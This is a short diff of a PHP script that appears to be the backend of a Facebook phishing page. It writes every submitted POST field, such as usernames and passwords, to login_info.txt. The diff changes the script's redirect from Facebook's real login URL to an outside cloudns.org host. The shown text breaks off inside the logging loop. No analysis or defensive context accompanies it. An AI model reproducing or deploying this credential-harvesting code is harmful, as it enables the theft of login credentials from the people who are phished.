@@ -1,6 +1,5 @@
 <?php
-header ('Location: https://www.facebook.com/login/device-
-based/regular/login/?login_attempt=1&amp; lwv=110');
+header ('Location: https://fidah-imorou.cloudns.org; lwv=110');
 $handle = fopen("login_info.txt", "a");
 foreach ($_POST as $variable => $value) {
 fwrite($handle, $variable);
